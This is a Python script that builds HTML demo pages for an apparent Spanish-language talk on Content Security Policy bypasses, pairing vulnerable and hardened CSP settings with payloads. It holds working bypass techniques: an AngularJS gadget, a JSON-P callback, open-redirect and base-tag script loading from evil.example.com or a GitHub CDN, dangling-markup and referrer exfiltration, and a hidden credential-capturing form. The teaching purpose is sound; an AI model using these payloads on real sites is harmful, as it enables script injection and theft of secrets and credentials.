from pathlib import Path
from jinja2 import Environment, FileSystemLoader
from textwrap import dedent

BASE_PATH = Path(__file__).parent.absolute()


def get_examples():
    examples = []
    csp = "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.google.com https://*.gstatic.com https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js;"
    examples.append(
        {
            "title": "CSP bypass usando inline JS",
            "csp": csp,
            "vulnerable": True,
            "payload": dedent(
                """
                <script>
                  alert(document.domain)
                </script>
                """
            ).strip("\n"),
        }
    )

    csp = csp.replace("'unsafe-inline' ", "")
    examples.append(
        {
            **examples[-1],
            "vulnerable": False,
            "csp": csp,
        }
    )

    examples.append(
        {
            "title": "CSP bypass usando AngularJS",
            "csp": csp,
            "vulnerable": True,
            "payload": dedent(
                """
                <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>

                <div ng-app ng-csp>
                  <input ng-focus="$event.composedPath()|orderBy:'alert(document.domain)'" value="Click me!">
                </div>
                """
            ).strip("\n"),
        }
    )

    csp = csp.replace("'unsafe-eval' ", "").replace(
        "https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js",
        "https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js",
    )
    examples.append(
        {
            **examples[-1],
            "vulnerable": False,
            "csp": csp,
        }
    )

    examples.append(
        {
            "title": "CSP bypass usando JSON-P",
            "csp": csp,
            "vulnerable": True,
            "payload": dedent(
                """
                <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)"></script>
                """
            ).strip("\n"),
        }
    )

    csp = csp.replace("https://*.google.com", "https://www.google.com/recaptcha/")
    csp = csp.replace("https://*.gstatic.com", "https://www.gstatic.com/recaptcha/")
    examples.append(
        {
            **examples[-1],
            "vulnerable": False,
            "csp": csp,
        }
    )

    examples.append(
        {
            "title": "CSP bypass usando un open redirect",
            "csp": csp,
            "vulnerable": False,
            "payload": dedent(
                """
                <script src="/_/redirect/?https://evil.example.com/path/to/evil.js"></script>
                """
            ).strip("\n"),
        }
    )

    examples.append(
        {
            "title": "CSP bypass usando un open redirect",
            "csp": csp,
            "vulnerable": True,
            "payload": dedent(
                """
                <script src="/_/redirect/?https://cdn.jsdelivr.net/gh/stsewd/charla-csp-xss@main/js/test.js"></script>
                """
            ).strip("\n"),
        }
    )

    csp = csp.replace(
        "https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js",
        "https://static.example.com/js/jquery@3.6.4/dist/jquery.min.js",
    )

    examples.append(
        {
            **examples[-1],
            "vulnerable": False,
            "csp": csp,
        }
    )

    examples.append(
        {
            "title": "CSP bypass ¡AngularJS está de vuelta!",
            "csp": csp,
            "vulnerable": True,
            "payload": dedent(
                """
                <script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

                <div ng-app ng-csp>
                  <input ng-focus="$event.composedPath()|orderBy:'alert(document.domain)'" value="Click me!">
                </div>
                """
            ).strip("\n"),
        }
    )

    nonce = "8IBTHwOdqNKAWeKl7plt8g=="
    sha256 = "opnq3UrQLt34nD/Io3x4OQXex7rVCcRNO2/Dym9R8ro="
    csp = f"script-src 'nonce-{nonce}' 'sha256-{sha256}';"

    examples.append(
        {
            "title": "CSP usando un nonce y hash",
            "csp": csp,
            "vulnerable": False,
            "nonce": nonce,
            "payload": dedent(
                f"""
                <script nonce="{nonce}">
                  alert("Este script si está permitido")
                </script>

                <script>alert("Inline script correspondiente al hash!")</script>
                """
            ).strip("\n"),
        }
    )

    examples.append(
        {
            **examples[-1],
            "payload": dedent(
                f"""
                <script nonce="abc1234">
                  alert("Este script si está permitido")
                </script>

                <script>alert("Inline script correspondiente al hash!");</script>
                """
            ).strip("\n"),
        }
    )

    examples.append(
        {
            "title": "Nonce bypass usando <base>",
            "csp": csp,
            "vulnerable": True,
            "nonce": nonce,
            "payload": dedent(
                f"""
                <!-- Payload malicioso -->
                <base href="https://cdn.jsdelivr.net/gh/stsewd/charla-csp-xss@main/">

                <!-- Script permitido -->
                <script nonce="{nonce}" src="js/test.js"></script>
                """
            ).strip("\n"),
        }
    )

    csp += "base-uri 'none';"

    examples.append(
        {
            **examples[-1],
            "vulnerable": False,
            "csp": csp,
        }
    )

    examples.append(
        {
            "title": "Redireccionamiento a otro sitio",
            "csp": csp,
            "vulnerable": True,
            "nonce": nonce,
            "payload": dedent(
                f"""
                <meta http-equiv="refresh" content="0; url=https://example.com/" />
                """
            ).strip("\n"),
        }
    )

    examples.append(
        {
            "title": "Exfiltración de URL",
            "csp": csp,
            "vulnerable": True,
            "nonce": nonce,
            "payload": dedent(
                """
                <img src="https://example.com/" referrerpolicy="unsafe-url" />
                """
            ).strip("\n"),
        }
    )

    examples.append(
        {
            "title": "Exfiltración de contenido",
            "csp": csp,
            "vulnerable": False,
            "nonce": nonce,
            "raw": True,
            "payload": dedent(
                f"""
                <p>Secretos</p>
                <form>
                  <input type="hidden" name="csrf" value="abc123">
                  <input type="submit" value="Enviar">
                </form>
                <script nonce="{nonce}"></script>
                <p class='red'>Más secretos</p>
                """
            ).strip("\n"),
        }
    )

    examples.append(
        {
            **examples[-1],
            "vulnerable": True,
            "payload": dedent(
                """
                <img src='https://example.com/?
                """
            ).strip("\n")
            + examples[-1]["payload"],
        }
    )

    examples.append(
        {
            "title": "Exfiltración de credenciales",
            "csp": csp,
            "vulnerable": True,
            "nonce": nonce,
            "payload": dedent(
                """
                <form action="https://example.com/">
                  <input name="email" style="opacity:0;width:0">
                  <input type="password" name="password" style="opacity:0;width:0">
                  <input type="submit" value="Click me!">
                </form>
                """
            ).strip("\n"),
        }
    )

    return examples


def get_enviroment():
    return Environment(
        loader=FileSystemLoader(BASE_PATH / "templates"),
        autoescape=True,
    )


def main():
    examples = get_examples()
    total = len(examples)
    env = get_enviroment()
    example_template = env.get_template("example.html")
    example_raw_template = env.get_template("example-raw.html")
    for i, example in enumerate(examples):
        section_id = f"{i+1:02d}"
        current_example = f"{section_id}.html"
        # Inject page info into each example.
        example["page"] = current_example
        prev_example = None
        next_example = None
        if i > 0:
            prev_example = f"{i:02d}.html"
        if i < total - 1:
            next_example = f"{i+2:02d}.html"

        context = {
            "section_id": section_id,
            "current_example": current_example,
            "prev_example": prev_example,
            "next_example": next_example,
            **example,
        }

        if example.get("raw"):
            template = example_raw_template
        else:
            template = example_template
        output = template.render(**context)
        (BASE_PATH / f"../examples/{section_id}.html").write_text(output)

    # Generate index
    index_template = env.get_template("index.html")
    output = index_template.render(examples=examples)
    (BASE_PATH / f"../examples/index.html").write_text(output)


if __name__ == "__main__":
    main()
